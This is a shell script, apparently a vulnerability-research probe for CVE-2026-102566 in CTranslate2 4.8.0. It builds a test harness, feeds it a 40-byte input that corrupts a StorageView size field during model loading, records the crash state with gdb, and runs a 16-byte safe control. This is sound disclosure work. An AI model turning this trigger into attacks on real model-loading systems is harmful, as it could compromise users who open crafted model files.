#!/bin/sh
# W4 downstream-field probe for CVE-2026-102566. Bounded: one input, one
# gdb capture of the corrupted StorageView field consumed in get_variables().
# Offline; the payload exists only in this process, no probe off loopback.
set -eu
cd "$(dirname "$0")"
SRC=src/CTranslate2-4.8.0
INC="-I$SRC/include -I$SRC/third_party -Ishim -I$SRC/src"
REAL="$SRC/src/models/model_reader.cc $SRC/src/storage_view.cc $SRC/src/allocator.cc \
$SRC/src/cpu/allocator.cc $SRC/src/cpu/primitives.cc $SRC/src/cpu/backend.cc \
$SRC/src/cpu/cpu_isa.cc $SRC/src/cpu/kernels.cc $SRC/src/env.cc $SRC/src/types.cc \
$SRC/src/devices.cc"
FLAGS="-std=c++17 -O0 -g -ffunction-sections -fdata-sections -DCT2_X86_BUILD $INC -Wl,--gc-sections"

g++ $FLAGS harness/driver-ptr.cpp harness/stubs.cpp "$SRC/src/models/model.cc" $REAL -o consumer-downstream
mkdir -p evidence
sha256sum "$SRC/src/models/model.cc" > evidence/downstream-probe.sha256

# Plain run: file-chosen 40 bytes (default 'A' padding) reach copy_from with a
# corrupted destination _size; capture the exact exception text.
./consumer-downstream 40 > evidence/downstream-plain-40.out 2>&1 || true

# gdb: capture the backtrace and the corrupted object fields at the throw.
gdb -q -batch \
  -ex 'set pagination off' \
  -ex 'catch throw' \
  -ex 'run 40' \
  -ex 'bt 5' \
  -ex 'up 2' \
  -ex 'printf "DEST this=%p other=%p\n", this, &other' \
  -ex 'p other._size' \
  -ex 'p this->_size' \
  -ex 'p/x this->_data' \
  -ex 'x/10gx this' \
  --args ./consumer-downstream 40 > evidence/downstream-fields-40.txt 2>&1 || true

# Safe control: 16-byte payload is clean.
./consumer-downstream 16 > evidence/downstream-safe-16.out 2>&1 || true

printf 'sha256 of upstream model.cc used by downstream probe:\n'
cat evidence/downstream-probe.sha256
